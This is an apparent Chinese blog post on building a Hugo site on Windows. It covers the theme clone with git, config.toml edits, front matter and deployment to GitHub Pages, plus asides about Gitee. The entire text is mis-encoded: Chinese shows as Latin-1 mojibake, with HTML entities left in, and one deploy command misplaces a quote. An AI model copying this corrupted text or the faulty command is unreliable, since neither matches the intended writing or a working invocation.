æ˜¯ä¸€æ¬¾åŸºäºGoè¯­è¨€çš„å»ºç«™å·¥å…·ï¼Œå®˜ç½‘è¯´å®ƒæ˜¯â€œä¸–ç•Œä¸Šæœ€å¿«çš„ç½‘ç«™æ¡†æ¶â€ï¼Œä¸»è¦æ­£æ˜¯ç”±äºGoè¯­è¨€çš„é«˜æ•ˆã€‚è¿™æ¬¾è½¯ä»¶ä½¿ç”¨èµ·æ¥æ¯”è¾ƒç®€å•ï¼Œè™½ç„¶æˆ‘åœ¨æ•´ä¸ªæ­å»ºè¿‡ç¨‹ä¸­å‡ºäº†æ— æ•°é”™ï¼Œä½†æ˜¯åªè¦ä½ è·Ÿç€æˆ‘æ¥ä¸‹æ¥çš„ä»‹ç»èµ°ï¼Œå°±åªéœ€è¦ä½¿ç”¨çŸ­çŸ­çš„å‡ ä¸ªå‘½ä»¤ã€‚\nä½†æ˜¯é¦–å…ˆï¼Œä¸‹è½½ä¸€ä¸ªHugoæ˜¯ä¸€åˆ‡æ­¥éª¤çš„å¼€å§‹ã€‚ä»¥ä¸‹æ­¥éª¤å…¨éƒ¨åŸºäºWindows10ç³»ç»Ÿï¼ˆä¸»è¦æ˜¯æˆ‘æ²¡æœ‰Macï¼‰ã€‚\næˆ‘ä»¬å»åˆ°ä¸‹é¢çš„è¿™ä¸ªç½‘å€ï¼š\nhttps://github.com/gohugoio/hugo/releases\nåœ¨é‡Œé¢ä½ å¯ä»¥ä¸‹è½½Windowsç³»ç»Ÿä¸‹çš„Hugoï¼Œæ³¨æ„æ˜¯Hugo_extendè€Œä¸æ˜¯hugoï¼Œå› ä¸ºæœ‰äº›ä¸»é¢˜é‡Œé¢ç”¨åˆ°äº†SASS/SCSSï¼Œéœ€è¦extendç‰ˆæœ¬çš„hugoæ‰èƒ½å®Œæˆç¼–è¯‘ã€‚\nå°†ä¸‹è½½çš„å‹ç¼©åŒ…è§£å‹ï¼Œå¾—åˆ°ä¸€ä¸ªæ–‡ä»¶å¤¹ï¼Œé‡Œé¢æœ‰hugo.exeã€‚æ¥ä¸‹æ¥å°†è¿™ä¸ªæ–‡ä»¶å¤¹çš„ä½ç½®æ·»åŠ åˆ°ç³»ç»Ÿç¯å¢ƒå˜é‡ä¸­ï¼Œå°±è·Ÿä½ é…ç½®javaæˆ–è€…æ˜¯pythonå®Œå…¨ä¸€æ ·ï¼Œè¿˜éœ€è¦æˆ‘å†è®²å—ï¼Ÿ\nå¥½å§ï¼Œå¿µåŠè¿™ç¯‡åšæ–‡ä¸»è¦æ˜¯å†™ç»™åƒå½“å¹´çš„æˆ‘ä¸€æ ·å¹´è½»ä¸”å¥½å¥‡çš„åŒå­¦ï¼Œå¦‚æœæœ‰ä»»ä½•é—®é¢˜ï¼Œè¿˜è¯·ç…§ç€ä»¥ä¸‹æ­¥éª¤æ¥ï¼š\nå³é”® æˆ‘çš„ç”µè„‘ \u0026ndash;\u0026gt; å±æ€§ \u0026ndash;\u0026gt; é«˜çº§ç³»ç»Ÿè®¾ç½®ï¼ˆåœ¨å·¦è¾¹æ é‡Œï¼‰ \u0026ndash;\u0026gt; ç¯å¢ƒå˜é‡ï¼ˆåœ¨å¼¹å‡ºçš„çª—å£çš„å³ä¸‹è§’ï¼‰ \u0026ndash;\u0026gt; åœ¨ç³»ç»Ÿå˜é‡ä¸­æ‰¾åˆ° path è¿™ä¸€æ ï¼ŒæŠŠä½ æ”¾ç½®Hugo.exeçš„æ–‡ä»¶å¤¹è·¯å¾„å†™è¿›å»ã€‚\næ¥ä¸‹æ¥æ‰“å¼€ä½ çš„å‘½ä»¤è¡Œçª—å£ï¼Œè¯•ç€æ‰§è¡Œ hugo version ï¼Œå¦‚æœä½ æ²¡æœ‰å¾—åˆ°æŠ¥é”™ï¼Œè€Œæ˜¯å¾—åˆ°äº†ä¸€ä¸ªhugoçš„ç‰ˆæœ¬ä¿¡æ¯ï¼Œé‚£ä¹ˆæ­å–œä½ ï¼Œä½ å–å¾—äº†ä¸€ä¸ªéå¸¸ä¸é”™çš„å¼€ç«¯ï¼\næ–°å»ºç«™ç‚¹ ç”¨hugoæ–°å»ºç«™ç‚¹å®åœ¨æ˜¯éå¸¸ç®€å•ã€‚åœ¨ä½ ç”µè„‘ä¸ŠæŸä¸ªä½ç½®æ‰“å¼€ä½ çš„å‘½ä»¤è¡Œï¼Œæ•²ä¸Šå‘½ä»¤ï¼š\nhugo new site [yourSiteName]\nå°±å®Œäº‹äº†ï¼è¿™é‡Œçš„ [yourSiteName] å¯ä»¥æ›¿æ¢æˆä»»ä½•ä½ æƒ³è¦çš„åå­—ï¼Œä¸ºä½ çš„ç½‘ç«™èµ·ä¸ªå¥½åå§ï¼\nå¦‚æœé¡ºåˆ©çš„è¯ï¼Œä½ å°†ä¼šå¾—åˆ°ä¸€ä¸ªåå­—ä¸ºyourSiteNameçš„æ–‡ä»¶å¤¹ï¼Œé‡Œé¢æœ‰ä¸€äº›hugoä¸ºä½ åˆå§‹åŒ–å¥½çš„æ–‡ä»¶å¤¹ï¼Œä½ å¯ä»¥ä½¿ç”¨lsæŸ¥çœ‹å®ƒä»¬ã€‚\næ–°å»ºç«™ç‚¹ é€‰æ‹©ä¸»é¢˜ â€œä¸€æ¬¾å¥½çœ‹çš„ä¸»é¢˜æ˜¯ä½ åšæŒå†™åšå®¢çš„æœ€å¤§åŠ¨åŠ›ã€‚â€ â€”â€”æ²ƒå…¹Â·åŸºÂ·ç¡•å¾·\nä½ ç°åœ¨æµè§ˆçš„â€”â€”ä¹Ÿå°±æ˜¯æˆ‘çš„åšå®¢â€”â€”ä¸»é¢˜æ˜¯ï¼šhttps://themes.gohugo.io/keepit/\nå®é™…ä¸Šï¼Œåœ¨ä¸Šé¢è¿™ä¸ªç½‘ç«™ä¸Šè¿˜æœ‰éå¸¸å¤šçš„é…·ç‚«çš„ä¸»é¢˜ï¼Œå®Œå…¨çœ‹ä½ çš„å–œå¥½å»é€‰æ‹©â€”â€”ä¸è€ƒè™‘é…ç½®éš¾åº¦çš„æƒ…å†µä¸‹ ãƒ½(ãƒ¼_ãƒ¼)ãƒ\nå½“ä½ é€‰å®šäº†ä¸€ä¸ªä¸»é¢˜ï¼Œç‚¹è¿›å»ï¼Œä¸€èˆ¬éƒ½ä¼šåœ¨åº•ä¸‹æœ‰ä¸€ä¸ªéå¸¸å‘¨åˆ°çš„å®‰è£…æŒ‡å—ï¼ˆçœŸçš„åªæ˜¯å®‰è£…æŒ‡å—o(â•¥ï¹â•¥)oï¼‰ã€‚\nå°±ä»¥è¿™æ¬¾KeepItä¸»é¢˜ä¸ºä¾‹ï¼Œæˆ‘ä»¬çš„ç½‘ç«™æ ¹ç›®å½•ä¸‹æœ‰ä¸€ä¸ªthemesæ–‡ä»¶å¤¹ï¼Œä½ åªéœ€è¦è¿›å…¥è¿™ä¸ªæ–‡ä»¶å¤¹ï¼Œä½¿ç”¨å‘½ä»¤git clone https://github.com/Fastbyte01/KeepIt.gitï¼Œå°±å¯ä»¥å°†è¿™ä¸ªä¸»é¢˜ä¸‹è½½åˆ°ä½ çš„ç½‘ç«™é‡Œäº†ã€‚ä»æ­¤ï¼Œä½ å°±å¯ä»¥å¿«ä¹åœ°ä½¿ç”¨themesæ–‡ä»¶å¤¹åº•ä¸‹å­˜åœ¨çš„ä¸»é¢˜ï¼Œè€Œä¸”å˜æ¢ä¸»é¢˜çš„æˆæœ¬éå¸¸ä¹‹ä½ï¼Œè¿™ä¸ªæˆ‘ä»¬ä¹‹åä¼šè®²ã€‚\n2022-04-05æ³¨ï¼šç›®å‰åšå®¢çš„ä¸»é¢˜å·²ç»ä¸æ˜¯KeepItï¼Œè€Œæ˜¯Stackï¼Œè¯¦æƒ…å‚è§ Hugo Stackä¸»é¢˜æ›´æ–°å°è®° (xrg.fj.cn) ã€‚\né…ç½®é¡µé¢ ç°åœ¨è®©ä½ çš„å‘½ä»¤è¡Œå›åˆ°ç½‘ç«™çš„æ ¹ç›®å½•ä¸‹ï¼Œå†™ä¸‹å‘½ä»¤hugo server --theme=keepit -Dï¼Œç„¶åä½ å°±å‘ç°hugoå·²ç»åœ¨ä½ çš„ç”µè„‘ä¸Šè·‘èµ·äº†ä¸€ä¸ªWebæœåŠ¡ã€‚æ‰“å¼€æµè§ˆå™¨ï¼Œæ ¹æ®å‘½ä»¤è¡Œçš„æç¤ºè¾“å…¥åœ°å€ï¼Œå°±å¯ä»¥è®¿é—®ä½ çš„é¡µé¢äº†ï¼åˆšæ‰è¯´è¿‡ï¼Œå½“ä½ çš„themesæ–‡ä»¶å¤¹ä¸‹é¢æœ‰å¤šä¸ªä¸»é¢˜æ—¶ï¼Œä½ å¯ä»¥è½»æ˜“åœ°æ›´æ¢å®ƒä»¬ï¼Œå…·ä½“çš„æ“ä½œå°±æ˜¯å°†--themeè¿™ä¸ªå‚æ•°æŒ‡å®šä¸ºä½ æƒ³ç”¨çš„ä¸»é¢˜çš„åå­—ï¼Œå°±é—®ä½ ç®€å•ä¸ï¼Ÿ\nå›åˆ°ä½ çš„ç½‘ç«™ä¸Šå§ï¼Œçœ‹çœ‹æ•ˆæœã€‚\nä»€ä¹ˆï¼Ÿä½ è¯´ä½ çš„é¡µé¢ç°åœ¨ç©ºæ— ä¸€ç‰©ï¼Ÿæˆ–è€…ä½ çš„é¡µé¢è¿˜åªæ˜¯ä¸ªæ¨¡æ¿ï¼Ÿç†æ‰€å½“ç„¶ã€‚å› ä¸ºä½ è¿˜æ²¡æœ‰é…ç½®å®ƒã€‚\næ‰“å¼€ä½ åˆšæ‰ä¸‹è½½çš„ä¸»é¢˜æ–‡ä»¶å¤¹ï¼Œä¸€èˆ¬æ¥è®²ï¼Œé‡Œé¢éƒ½æœ‰ä¸€ä¸ªexampleSiteæ–‡ä»¶å¤¹ï¼Œæ‰“å¼€å®ƒï¼ŒæŠŠé‡Œé¢çš„æ‰€æœ‰æ–‡ä»¶å¤åˆ¶åˆ°ç½‘ç«™æ ¹ç›®å½•ï¼Œç›´æ¥æ›¿æ¢æ‰ä½ åŸæœ‰çš„ä¸œè¥¿å³å¯ã€‚\n2022-04-05æ³¨ï¼šä¸ºäº†æ—¥åæ¢ä¸»é¢˜çš„æ–¹ä¾¿ï¼Œå·²ç»ä¸å»ºè®®å°† exampleSite å…¨éƒ¨å¤åˆ¶åˆ°æ ¹ç›®å½•ä¸­ã€‚ç›®å‰æ¥çœ‹ï¼Œæˆ‘ä»¬åªéœ€è¦å¤åˆ¶é‡Œé¢çš„ content æ–‡ä»¶å¤¹å’Œ config æ–‡ä»¶å³å¯ã€‚ä¿®æ”¹ä¸»é¢˜æ—¶ç›´æ¥è¿›å…¥ theme æ–‡ä»¶å¤¹ä¿®æ”¹ï¼Œè¿™æ ·ä¸€æ¥æ—¥åå¯ä»¥æ›´åŠ æ–¹ä¾¿åœ°æ”¹å˜åšå®¢ä¸»é¢˜ã€‚\nç°åœ¨å†è¿è¡Œï¼Œä½ å‘ç°ä½ çš„ç½‘ç«™å·²ç»é¢‡æœ‰ç‚¹æ ·å­äº†ï¼Œåªä¸è¿‡é‡Œé¢çš„é¡µé¢è¿˜æœ‰æ˜¾ç¤ºçš„å†…å®¹è¿˜æ˜¯åˆ«äººå†™å¥½çš„ï¼Œä½ å¸Œæœ›æŠŠå®ƒä»¬æ¢æˆè‡ªå·±çš„å†…å®¹ã€‚\nOKï¼Œä¸€æ­¥ä¸€æ­¥æ¥ã€‚é¦–å…ˆï¼Œæ ¹ç›®å½•åº•ä¸‹æœ‰ä¸€ä¸ªæ–‡ä»¶config.tomlï¼Œæ‰“å¼€å®ƒï¼Œä»¥keepitä¸»é¢˜ä¸ºä¾‹ï¼Œé‡Œé¢æ˜¯ä¸€ç³»åˆ—å‚æ•°åç§°å’Œæ•°å€¼ã€‚\nä»ä¸Šå¾€ä¸‹çœ‹ï¼Œåœ¨ç¬¬å››è¡Œæœ‰ä¸ªtitle = xxxï¼Œè¿™å°±æ˜¯ä½ çš„ç½‘ç«™çš„æ ‡é¢˜äº†ï¼Œä½ æŠŠå®ƒæ”¹æ‰ï¼Œç„¶åçœ‹çœ‹æ•ˆæœï¼Œä½ ç¬é—´å°±æ˜ç™½è¿™ä¸ªé…ç½®æ–‡ä»¶çš„ä½œç”¨äº†ï¼Œè¿™æ¯”æˆ‘åœ¨è¿™é‡Œç”¨æ–‡å­—æè¿°è¦ç”ŸåŠ¨ä¸€ä¸‡å€ã€‚\nç»§ç»­å¾€ä¸‹çœ‹ï¼Œä½ å¯ä»¥æ‰¾åˆ°ä¸€ä¸ªç”¨ä¸­æ‹¬å·æ‹¬èµ·æ¥çš„[menu]å­—æ®µï¼Œåœ¨åº•ä¸‹ä½ çœ‹åˆ°äº†ä»€ä¹ˆï¼Ÿyesï¼Œä½ ç°åœ¨å¯ä»¥é…ç½®é¡¶æ äº†ï¼æ¯”å¦‚ï¼Œæˆ‘å°†åº•ä¸‹ç¬¬ä¸€ä¸ª[[menu.main]]çš„nameå­—æ®µç”±postæ”¹ä¸ºåšæ–‡ï¼Œåœ¨ç½‘é¡µå¯¹åº”çš„ä½ç½®ï¼Œpostä¹Ÿå˜æˆäº†åšæ–‡ï¼\nç»§ç»­å¾€ä¸‹çœ‹ï¼Œä½ å¯ä»¥çœ‹åˆ°ä¸€ä¸ª[params]å­—æ®µï¼Œè¿™æ˜¯é€‚ç”¨äºæ•´ä¸ªç«™ç‚¹çš„ä¸€äº›å‚æ•°ã€‚é‡Œé¢æœ‰ä¸ªavatarå‚æ•°ï¼Œå®ƒç”¨äºé…ç½®ä½ çš„ä¸»é¡µé¢ä¸Šçš„é‚£ä¸ªå¤´åƒï¼Œä½ å¯ä»¥æŠŠå®ƒæ³¨é‡Šæ‰ï¼Œç„¶åå¯ç”¨ä¸‹æ–¹å‡ è¡Œçš„[params.gravatar]å­—æ®µï¼Œå®ƒä¼šå°†ä½ çš„ä¸»é¡µå›¾ç‰‡æ›¿æ¢ä¸ºä½ ç‹¬æœ‰çš„gravatarï¼Œå½“ç„¶ï¼Œå¦‚æœä½ ä¸çŸ¥é“ä»€ä¹ˆæ˜¯gravatarï¼Œç™¾åº¦ä¹‹ã€‚\nä¸»é¡µçš„åº•ä¸‹æœ‰å››ä¸ªé“¾æ¥æŒ‰é’®ï¼Œä½ åœ¨[params.social]å­—æ®µä¸‹å¯ä»¥æ‰¾åˆ°å¯¹åº”çš„é…ç½®ã€‚æ¯”å¦‚æˆ‘ï¼Œå°±æŠŠé‡Œé¢çš„Instagramã€Linkedinéƒ½æ³¨é‡Šæ‰äº†ï¼Œåªä¿ç•™äº†Twitterå’ŒGithubï¼Œæ‰€ä»¥ä½ åœ¨æˆ‘çš„ä¸»é¡µä¸Šåªèƒ½æ‰¾åˆ°è¿™ä¸¤ä¸ªé“¾æ¥ã€‚\nç»§ç»­å¾€ä¸‹ï¼Œå°±æ˜¯ä¸€äº›æ— å…³ç´§è¦çš„å‚æ•°äº†ï¼Œä½ å¯ä»¥æš‚ä¸”å¿½ç•¥å®ƒä»¬ã€‚å½“ä½ èµ°åˆ°è¿™é‡Œï¼Œä½ çš„ç½‘ç«™å·²ç»åˆæ­¥å…·æœ‰ä½ çš„ä¸ªäººç‰¹è‰²äº†ï¼Œä½†æˆ‘è¿˜è¦å¸¦ä½ ç»§ç»­é…ç½®ä½ çš„ç½‘ç«™ã€‚\nè¿›ä¸€æ­¥é…ç½®é¡µé¢ ä»ä½ çš„ä¸»é¡µä¸Šç‚¹å‡»å¤´åƒæˆ–è€…å³ä¸Šè§’è¿›å…¥postï¼Œä½ ä¼šå‘ç°é‡Œé¢çš„æ–‡ç« éƒ½æ˜¯ä¸€äº›åˆ«äººå·²ç»å†™å¥½çš„ä¸œè¥¿ï¼Œä½ ä¸€å®šä¼šå¸Œæœ›æŠŠå®ƒä»¬æ¢æ‰ï¼Œä½†æ˜¯å®ƒä»¬åœ¨å“ªé‡Œï¼Ÿ\næ‰“å¼€ç½‘ç«™çš„æ ¹ç›®å½•ï¼Œè¿›å…¥contentï¼Œä½ ä¼šçœ‹åˆ°ä¸€ä¸ªpostsæ–‡ä»¶å¤¹å’Œä¸€ä¸ªprojectsæ–‡ä»¶å¤¹ï¼Œè¿˜æœ‰ä¸€ä¸ªaboutme.mdæ–‡ä»¶ï¼Œå®ƒä»¬æ˜¯ä»€ä¹ˆï¼Ÿ\nè¿›å…¥postsæ–‡ä»¶å¤¹ï¼Œæ‰€æœ‰çš„åšæ–‡éƒ½å­˜åœ¨è¿™é‡Œã€‚ä½ å¯ä»¥æŠŠé‡Œé¢çš„æ–‡ä»¶åˆ æ‰ï¼Œæ¢æˆä½ è‡ªå·±çš„Markdownæ–‡ä»¶ï¼Œä½†æ˜¯ä¸è¦æ€¥ï¼Œå…ˆæ‰“å¼€åˆ«äººçš„æ–‡ä»¶ï¼Œçœ‹çœ‹hugoè§£ææ–‡ä»¶æ—¶éœ€è¦çš„ç‰¹å®šçš„æ ¼å¼ï¼š\næ¯”å¦‚æˆ‘æ‰“å¼€äº†hugoisforlovers.mdï¼Œåœ¨é‡Œé¢ï¼Œå¤´å‡ è¡Œçš„ä½ç½®æˆ‘ä»¬èƒ½çœ‹åˆ°è¿™äº›ä¸œè¥¿ï¼š\ntitle = \u0026#34;Getting Started with Hugo\u0026#34; description = \u0026#34;\u0026#34; type = [\u0026#34;posts\u0026#34;,\u0026#34;post\u0026#34;] tags = [ \u0026#34;go\u0026#34;, \u0026#34;golang\u0026#34;, \u0026#34;hugo\u0026#34;, \u0026#34;development\u0026#34;, ] date = \u0026#34;2014-04-02\u0026#34; categories = [ \u0026#34;Development\u0026#34;, \u0026#34;golang\u0026#34;, ] series = [\u0026#34;Hugo 101\u0026#34;] [ author ] name = \u0026#34;Hugo Authors\u0026#34; å®ƒä»¬æ˜¯ä¸€ä¸ªæ–‡ä»¶è¢«è§£ææ—¶éœ€è¦çš„ä¸€äº›å‚æ•°ã€‚æ¯”å¦‚æ–‡ä»¶æ ‡é¢˜ titleï¼Œæ¯”å¦‚æ–‡ä»¶ç±»å‹tagså’Œcaterogiesï¼Œä½ è‡ªå·±å†™Markdownæ–‡ä»¶æ—¶ä¹Ÿéœ€è¦åœ¨å¤´éƒ¨é™„ä¸Šè¿™äº›ä¸œè¥¿ï¼Œå¦åˆ™å®ƒåœ¨ä½ çš„ç½‘ç«™ä¸Šå°±æ— æ³•ä½“ç°å‡ºç›¸å…³çš„ä¿¡æ¯ã€‚å…·ä½“çš„åšæ³•æ˜¯ä½¿ç”¨ä¸¤è¡Œ---æŠŠä½ çš„è¿™äº›ä¿¡æ¯å¤¹èµ·æ¥ï¼Œç„¶åhugoå°±èƒ½è¿›è¡Œè¯†åˆ«äº†ã€‚å¦‚æœæ˜¯æ™ºèƒ½ä¸€ç‚¹çš„Markdownç¼–è¾‘å™¨ï¼Œå¯èƒ½ç›´æ¥å¼¹å‡ºä¸€ä¸ªéå¸¸æ˜æ˜¾çš„æç¤ºï¼Œå‘ŠçŸ¥ä½ è¿™é‡Œæ˜¯è¾“å…¥å¤´éƒ¨ä¿¡æ¯çš„åœ°æ–¹ã€‚åœ¨æ­¤å¼ºçƒˆæ¨èTyporaï¼ï¼\nä¼šä¿®æ”¹ä½ çš„åšæ–‡ä¹‹åï¼Œä½ å¯ä»¥é¡ºä¾¿æ”¹ä¸€æ”¹about.mdï¼Œå®ƒæ˜¯è¿™ä¸ªä¸»é¢˜é‡Œé¢è‡ªæˆ‘ä»‹ç»çš„é‚£ä¸€é¡µã€‚\nä¸€åˆ‡éƒ½å®Œäº‹ä¹‹åï¼Œä½ çš„ç½‘ç«™å·²ç»æ˜¯ä¸€ä¸ªæ‰¿è½½ç€ä½ ä¸ªäººä¿¡æ¯ã€å­˜æ”¾ç€ä½ ä¸ªäººåšæ–‡çš„ç«™ç‚¹äº†ã€‚ä½ å¯ä»¥ç›´æ¥è¿›å…¥å‘å¸ƒç¯èŠ‚ï¼Œä¹Ÿå¯ä»¥å†è¿›è¡Œæ›´ç²¾ç»†çš„é…ç½®â€”â€”ä¿®æ”¹ç½‘é¡µæºç ã€‚\næˆ‘ä»¬çš„ç½‘ç«™é¡µé¢éƒ½åœ¨ä½ çš„ä¸»é¢˜æ–‡ä»¶å¤¹é‡Œé¢ã€‚è¿›å…¥ä½ çš„ä¸»é¢˜æ–‡ä»¶å¤¹ï¼Œèƒ½çœ‹åˆ°ä¸€ä¸ªlayoutsçš„æ–‡ä»¶å¤¹ï¼Œç‚¹è¿›å»ï¼Œé‡Œé¢æ˜¯ä¸€äº›æ¨¡æ¿HTMLã€‚æœ‰äº›ä¸»é¢˜é‡Œï¼Œä½ å¯ä»¥ä»index.htmlæ–‡ä»¶ä¿®æ”¹ä¸€äº›ä¿¡æ¯ï¼Œä½†æ˜¯åœ¨æˆ‘ä»¬çš„keepitä¸»é¢˜ï¼Œè¿™ä¸ªæ–‡ä»¶å¹¶æ²¡æœ‰ä»€ä¹ˆä»·å€¼ï¼Œä½ éœ€è¦å†è¿›å…¥partialsæ–‡ä»¶å†…ï¼Œè¿™é‡Œçš„æ–‡ä»¶ä»¬æ‰æ˜¯ä½ éœ€è¦é˜…è¯»ä¸ä¿®æ”¹çš„ã€‚\nä½ å¯ä»¥çœ‹åˆ°ä¸€ä¸ªhome_profile.htmlæ–‡ä»¶ï¼Œè¿™æ˜¯é»˜è®¤æƒ…å†µä¸‹ä½ çš„ä¸»é¡µã€‚ä»”ç»†é˜…è¯»ï¼Œä½ åº”è¯¥å¯ä»¥æ‚Ÿåˆ°è¿™é‡Œä½¿ç”¨äº†å¾ˆå¤šé…ç½®æ–‡ä»¶ä¸­çš„å‚æ•°ï¼Œæ¯”å¦‚{{ .Site.Params.avatar}}ï¼Œå°±æ˜¯ä½ åœ¨é…ç½®æ–‡ä»¶ä¸­å®šä¹‰çš„å›¾åƒï¼\næ¢ä¸€ä¸ªæ–‡ä»¶ï¼Œæ¯”å¦‚footer.htmlï¼Œä½ åº”è¯¥å¯ä»¥æ‚Ÿåˆ°è¿™ä¸€é¡µæŒç®¡ç€ä¸»é¡µä¸‹æ–¹çš„ç‰ˆæƒè¯´æ˜ï¼å¦‚æœä½ ä¸æ»¡æ„ä¸»é¡µåº•ä¸‹çš„copyrightï¼Œä¸å¦¨å¯¹å…¶è¿›è¡Œä¿®æ”¹ã€‚\nè¿™é‡Œçš„æ–‡ä»¶ä¸å¯èƒ½é€ä¸€è®²è§£ï¼Œè‡ªå·±å»é˜…è¯»å®ƒä»¬ï¼Œæ—¶åˆ»ç‰¢è®°ä½ é…ç½®æ–‡ä»¶é‡Œçš„ä¸œè¥¿ï¼Œä½ å®Œå…¨å¯ä»¥é…ç½®ä¸€ä¸ªå¾ˆæ¼‚äº®çš„é¡µé¢ã€‚\nå°†é¡µé¢éƒ¨ç½²åˆ°GitHubä¸Š å¯¹äºé¡µé¢çš„é…ç½®ï¼Œæˆ‘ç›®å‰è®²çš„å®Œå…¨æ˜¯å¤Ÿç”¨äº†ï¼ˆä¸»è¦æ˜¯å…¶ä»–çš„æ“ä½œæˆ‘ä¹Ÿä¸ä¼š xï¼‰ã€‚å¦‚æœä¹‹åæœ‰æ›´å¤šçš„éœ€æ±‚ï¼Œå®Œå…¨å¯ä»¥æ–°å¼€ä¸€ç¯‡åšæ–‡ï¼Œåœ¨æ­¤å°±ä¸å¤šèµ˜è¿°äº†ã€‚\næˆ‘ä»¬ç°åœ¨éœ€è¦å°†é¡µé¢éƒ¨ç½²åˆ°GitHubä¸Šï¼Œä¸ºä»€ä¹ˆä¸ç”¨Giteeï¼Ÿå› ä¸ºGiteeä¼šå‡ºç°ä¸€å¤§å †è·¯å¾„é—®é¢˜ã€‚ä½ ä¸è¦è§‰å¾—æˆ‘åœ¨é€ è°£ï¼Œä¹Ÿä¸è¦è§‰å¾—ç½‘ä¸Šä¸€å †åšå®¢å¯ä¾›å‚è€ƒï¼Œäº‹å®å°±æ˜¯æˆ‘å°è¯•äº†å‡ å¤©ï¼Œçœ‹äº†ä¸€å¤§å †æ–‡ç« ï¼Œä½†æ˜¯æˆ‘çš„Giteeä¸Šçš„åšå®¢å®Œå…¨æ— æ³•åŠ è½½æ ·å¼ã€‚\nåœ¨è¿™é‡Œä¸ç¦æƒ³è®²é“ç†ï¼Œå›½å®¶æˆ˜ç•¥æ”¯æŒçš„å¹³å°å°±è¿™ä¹ˆä¸ªé¸Ÿæ ·å­ï¼Œæƒ³åšåˆ°è·ŸGitHubåˆ†åº­æŠ—ç¤¼çœŸçš„æ˜¯ä»»é‡é“è¿œã€‚\nå¦‚æœä½ æˆåŠŸåœ¨Giteeä¸Šéƒ¨ç½²äº†è‡ªå·±çš„åšå®¢ï¼Œæ¬¢è¿è”ç³»æˆ‘ï¼Œæˆ‘éå¸¸ä¹æ„å­¦ä¹ ï¼Œå¹¶å°†è‡ªå·±çš„åšå®¢è¿ç§»åˆ°Giteeä¸Šã€‚\n2022-04-05æ³¨ï¼šGiteeçš„æ˜“ç”¨æ€§å·²ç»å¾—åˆ°äº†é•¿è¶³çš„æ”¹è¿›ï¼Œæˆ‘åœ¨è¿™é‡Œä¿ç•™æ­¤å‰çš„ç‰¢éªšä¹‹è¯­ï¼Œä»¥ä¾§é¢æ˜ è¯Giteeçš„ä»¤äººæ¬£æ…°çš„è¿›æ­¥ã€‚ä¸è¿‡ï¼ŒGiteeä¸Šé¢å…³äºè¨€è®ºçš„è‡ªåŠ¨å®¡æŸ¥ä¸å¤Ÿæ™ºèƒ½ï¼Œæˆ‘ä»ç„¶ä½¿ç”¨Githubä½œä¸ºåšå®¢éƒ¨ç½²çš„å¹³å°ã€‚\nå›åˆ°ä¸»é¢˜ï¼Œé¦–å…ˆè¦åœ¨GitHubä¸Šå»ºç«‹ä¸€ä¸ªä»“åº“ï¼Œè¿™ä¸ªä»“åº“çš„åå­—éå¸¸ç‰¹æ®Šï¼Œå®ƒå¿…é¡»æ˜¯username.github.ioï¼Œå…¶ä¸­çš„usernameå°±æ˜¯ä½ çš„GitHubç”¨æˆ·åã€‚æ¯”å¦‚æˆ‘çš„ç”¨æˆ·åæ˜¯SGS4everï¼Œé‚£ä¹ˆæˆ‘çš„ä»“åº“å°±æ˜¯SGS4ever.github.ioã€‚\nå»ºç«‹å®Œæˆåï¼Œåœ¨ç«™ç‚¹æ ¹ç›®å½•ä¸‹ä½¿ç”¨å‘½ä»¤hugo --theme=keepit --baseUrl=\u0026quot;https://SGS4ever.github.io -D\u0026quot;ä½ å°±ä¼šå¾—åˆ°ä¸€æ–‡ä»¶å¤¹publicï¼Œè¿›å…¥å®ƒï¼Œåœ¨é‡Œé¢æ‰“å¼€GitBashï¼Œè¿›è¡Œä¸€ç³»åˆ—æ“ä½œï¼š\ngit init git add . git commit -m \u0026#34;Your comment\u0026#34; git remote add origin https://xxxxxxxxxxx # æ³¨æ„ï¼Œè¿™é‡Œçš„https://xxxxxx æ˜¯ä½ åˆšåˆ›å»ºçš„ä»“åº“çš„åœ°å€ï¼Œä¹Ÿå°±æ˜¯å½“ä½ è¿›å…¥ä»“åº“é¡µé¢ï¼Œä½ çš„æµè§ˆå™¨ä¸Šæ–¹åœ°å€æ é‡Œé¢çš„ä¸œè¥¿ã€‚ git push -u origin master è¿™äº›æ“ä½œä¹‹åï¼Œä½ çš„GitHubä»“åº“é‡Œå°±å¤šäº†å¾ˆå¤šä¸œè¥¿äº†ï¼Œå®Œå…¨ä¸éœ€è¦ä»»ä½•æ“ä½œï¼Œç›´æ¥æ‰“å¼€æµè§ˆå™¨è®¿é—®https://username.github.ioå§ï¼\nå†™åœ¨æœ€å æ­å»ºåšå®¢çœŸçš„æ˜¯è´¹äº†å¾ˆå¤§çš„åŠŸå¤«ï¼Œä½†æˆ‘ä¸‡ä¸‡æ²¡æƒ³åˆ°è¿™äº›æ— ç”¨åŠŸå®é™…ä¸Šæ˜¯Giteeçš„é—®é¢˜ï¼Œå®åœ¨æ˜¯æ„¤æ„éš¾å¹³ã€‚\nå›½äº§çš„å¾ˆå¤šä¸œè¥¿â€”â€”å¹¶ä¸æ­¢Giteeâ€”â€”å¸Œæœ›ä¸å›½å¤–çš„ä¸œè¥¿ç«äº‰ï¼Œè¿˜éœ€è¦éå¸¸åŠªåŠ›ã€‚æœ‰äº›æƒ…å†µä¸‹å¹¶ä¸æ˜¯ä½ å®ç°äº†åŒæ ·çš„åŠŸèƒ½ï¼Œä½ å°±å…·å¤‡äº†åŒæ ·çš„ç«äº‰åŠ›ï¼Œè¿˜éœ€è¦è€ƒè™‘åˆ°è¿™äº›åŠŸèƒ½çš„æ˜“ç”¨æ€§ã€ç¨³å®šæ€§ã€‚å½“ä½ çš„ä¸œè¥¿ç”¨èµ·æ¥æ¯”åˆ«äººæ›´ç¹çï¼Œä»¥è‡³äºè¿™ç§ç¹çç»™ç”¨æˆ·å¸¦æ¥çš„è´Ÿé¢æ„Ÿå—å‹è¿‡äº†çˆ±å›½æƒ…æ€€çš„æ­£é¢åŠ æŒï¼Œä½ çš„ç«äº‰å°±æ³¨å®šå¤±è´¥äº†ã€‚\n2022-03-16æ³¨ï¼šå²æœˆä¸å±…ï¼Œæ—¶èŠ‚å¦‚æµï¼ŒGitee Pageçš„æ˜“ç”¨æ€§å·²ç»å¾—åˆ°äº†å¾ˆå¤§çš„æå‡ï¼Œä¸”æˆ‘çš„åšå®¢ä¸»é¢˜æ—©å·²ä¸æ˜¯keepitäº†ï¼›\n","date":"2020-09-18T00:00:00Z","permalink":"https://xrg.fj.cn/p/%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA%E6%8C%87%E5%8D%971/","title":"åšå®¢æ­å»ºæŒ‡å—â€”â€”1"}]